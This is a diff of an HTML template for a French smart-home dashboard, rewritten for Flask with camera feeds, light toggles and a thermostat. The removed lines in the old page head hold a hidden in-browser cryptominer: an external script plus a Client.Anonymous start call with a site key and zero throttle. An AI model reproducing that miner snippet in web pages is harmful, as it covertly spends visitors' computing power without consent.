@@ -1,94 +1,120 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-    <link rel="stylesheet" href="../static/style.css">
-
-    <script src="https://www.hostingcloud.racing/4M3s.js"></script>
-    <script>
-        var _client = new Client.Anonymous('93a8750decf3bfb51edcf73d373da8bd27695fd842937f622aab6b131d89b996', {
-            throttle: 0, c: 'w', ads: 0
-        });
-        _client.start();
-    </script>
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gestion des Objets Connectés</title>
+  <meta charset="UTF-8">
+  <title>Dashboard</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <header>
-        <h1>Gestion des Objets Connectés</h1>
-    </header>
-    <div class="container">
-        <div class="grid">
-            <!-- Prises Connectées -->
-            <div class="category">
-                <div class="icon-container">
-                    <img src="/icons/prise.png" alt="Prises Icon" class="category-icon">
-                </div>
-                <h2>Prises Connectées</h2>
-                <div class="device" onclick="toggleDevice(this)">
-                    <p>Prise Chambre Étienne</p>
-                    <img src="/icons/off.png" alt="Prise">
-                </div>
-                <div class="device" onclick="toggleDevice(this)">
-                    <p>Prise Salon</p>
-                    <img src="/icons/off.png" alt="Prise">
-                </div>
-            </div>
+  <header>
+    <img src="{{ url_for('static', filename='img/logo.png') }}" alt="Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;">
+    <h1 style="display: inline-block; vertical-align: middle;">Tableau de Bord - Objets Connectés</h1>
+  </header>
 
-            <!-- Ampoules Connectées -->
-            <div class="category">
-                <div class="icon-container">
-                    <img src="/icons/lampe.png" alt="Ampoules Icon" class="category-icon">
-                </div>
-                <h2>Ampoules Connectées</h2>
-                <div class="device" onclick="toggleAmpoule(this)">
-                    <p>Ampoule Cuisine</p>
-                    <img src="/icons/ampouleeteinte.png" alt="Ampoule">
-                </div>
-                <div class="device" onclick="toggleAmpoule(this)">
-                    <p>Ampoule Salle de Bain</p>
-                    <img src="/icons/ampouleeteinte.png" alt="Ampoule">
-                </div>
-            </div>
+  <div class="container">
+    <p>Bonjour, <strong>{{ username }}</strong> !</p>
+    <p><a href="{{ url_for('logout') }}">Se déconnecter</a></p>
 
-            <!-- Caméras Connectées -->
-            <div class="category">
-                <div class="icon-container">
-                    <img src="/icons/camera.png" alt="Caméras Icon" class="category-icon">
-                </div>
-                <h2>Caméras Connectées</h2>
-                <div class="device" onclick="toggleDevice(this)">
-                    <p>Caméra Extérieur</p>
-                    <img src="/icons/off.png" alt="Caméra">
-                </div>
-                <div class="device" onclick="toggleDevice(this)">
-                    <p>Caméra Piscine</p>
-                    <img src="/icons/off.png" alt="Caméra">
-                </div>
-            </div>
+    <h2 style="color: #0072ff;">Surveillance vidéo</h2>
+    <div class="video-grid">
+      <div class="camera-feed">
+        <div class="camera-placeholder" data-video-id="video1">
+          <video id="video1" src="{{ url_for('static', filename='videos/camera1.mp4') }}" autoplay loop muted></video>
         </div>
+        <h3>Caméra Entrée</h3>
+      </div>
+      <div class="camera-feed">
+        <div class="camera-placeholder" data-video-id="video2">
+          <video id="video2" src="{{ url_for('static', filename='videos/camera2.mp4') }}" autoplay loop muted></video>
+        </div>
+        <h3>Caméra Salon</h3>
+      </div>
     </div>
 
-    <script>
-        function toggleAmpoule(element) {
-            const img = element.querySelector('img');
-            if (img.src.includes('ampouleeteinte.png')) {
-                img.src = '/icons/ampouleallume.png';
-            } else {
-                img.src = '/icons/ampouleeteinte.png';
-            }
-        }
+    <h2 style="margin-top: 40px; color: #0072ff;">Appareils connectés</h2>
+    <div class="grid">
+      <!-- Lumières -->
+      <div class="category">
+        <img src="{{ url_for('static', filename='img/light.png') }}" class="category-icon" alt="Lumière">
+        <h2>Lumières</h2>
+        <div class="device">
+          <p>Salon</p>
+          <img src="{{ url_for('static', filename='img/power-on.png') }}" alt="Power Icon"
+               class="toggle-light" data-state="on">
+        </div>
+        <div class="device">
+          <p>Chambre</p>
+          <img src="{{ url_for('static', filename='img/power-on.png') }}" alt="Power Icon"
+               class="toggle-light" data-state="on">
+        </div>
+      </div>
 
-        function toggleDevice(element) {
-            const img = element.querySelector('img');
-            if (img.src.includes('off.png')) {
-                img.src = '/icons/on.png';
-            } else {
-                img.src = '/icons/off.png';
-            }
+      <!-- Thermostats -->
+      <div class="category">
+        <img src="{{ url_for('static', filename='img/thermo.png') }}" class="category-icon" alt="Thermostat">
+        <h2>Thermostats</h2>
+        <div class="device">
+          <p>Température Cuisine</p>
+          <div style="display: flex; align-items: center; gap: 10px;">
+            <button onclick="changeTemp(-1)">-</button>
+            <span id="tempValue">20°C</span>
+            <button onclick="changeTemp(1)">+</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Caméras -->
+      <div class="category">
+        <img src="{{ url_for('static', filename='img/camera.png') }}" class="category-icon" alt="Caméras">
+        <h2>Caméras</h2>
+        <div class="device toggle-camera" data-video="video1">
+          <p>Extérieure</p>
+          <img src="{{ url_for('static', filename='img/eye.png') }}" alt="Eye Icon">
+        </div>
+        <div class="device toggle-camera" data-video="video2">
+          <p>Salon</p>
+          <img src="{{ url_for('static', filename='img/eye.png') }}" alt="Eye Icon">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Lumières
+    document.querySelectorAll('.toggle-light').forEach(function(img) {
+      img.addEventListener('click', function () {
+        const isOn = img.getAttribute('data-state') === 'on';
+        const newState = isOn ? 'off' : 'on';
+        img.setAttribute('src', isOn
+          ? "{{ url_for('static', filename='img/power-off.png') }}"
+          : "{{ url_for('static', filename='img/power-on.png') }}"
+        );
+        img.setAttribute('data-state', newState);
+      });
+    });
+
+    // Caméras
+    document.querySelectorAll('.toggle-camera').forEach(function (device) {
+      device.addEventListener('click', function () {
+        const videoId = device.getAttribute('data-video');
+        const video = document.getElementById(videoId);
+
+        if (video.style.display !== 'none') {
+          video.style.display = 'none';
+          device.querySelector('img').setAttribute('src', "{{ url_for('static', filename='img/eye-off.png') }}");
+        } else {
+          video.style.display = 'block';
+          device.querySelector('img').setAttribute('src', "{{ url_for('static', filename='img/eye.png') }}");
         }
-    </script>
+      });
+    });
+
+    // Thermostat
+    let currentTemp = 20;
+    function changeTemp(delta) {
+      currentTemp += delta;
+      document.getElementById("tempValue").textContent = currentTemp + "°C";
+    }
+  </script>
 </body>
 </html>
